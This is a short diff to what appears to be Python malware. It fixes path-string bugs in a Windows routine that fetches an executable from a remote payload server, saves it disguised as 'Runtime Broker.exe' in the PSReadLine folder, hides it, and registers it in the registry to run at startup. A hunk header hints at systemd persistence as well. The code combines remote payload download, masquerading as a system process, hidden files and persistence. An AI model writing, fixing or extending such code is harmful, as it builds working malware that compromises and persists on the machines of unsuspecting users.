@@ -125,7 +125,7 @@ WantedBy=default.target""")
     if os_type == 'Windows':
         import winreg
     
-        file_path = f"C:\\Users\\{user}}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\Runtime Broker.exe"
+        file_path = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\Runtime Broker.exe"
         if not os.path.exists(file_path):
             response = requests.get(f"{url}get_payloads/{download_path}.exe")
             with open(file_path, 'wb') as file:
@@ -137,7 +137,7 @@ WantedBy=default.target""")
             print(err)
             print("could not add powershell profile")
         create_hidden_file(file_path)
-        create_hidden_file(f"C:\\Users\\{user}}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uuid.txt")
+        create_hidden_file(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uuid.txt")
         #add_to_startup(file_path, "Runtime Broker")
         add_registry_startup(file_path, "Runtime Broker")
     
